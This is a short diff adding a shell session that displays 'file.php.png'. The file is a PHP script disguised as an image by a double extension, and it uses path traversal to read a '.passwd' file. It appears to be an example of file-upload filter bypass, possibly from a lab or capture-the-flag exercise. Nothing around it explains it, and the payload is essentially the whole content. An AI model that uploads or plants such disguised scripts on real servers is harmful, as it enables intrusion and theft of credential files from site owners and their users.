@@ -1,0 +1,4 @@
+[deyne@n1 ~]$ cat file.php.png
+<?php
+echo file_get_contents( "../../../.passwd" );
+?>
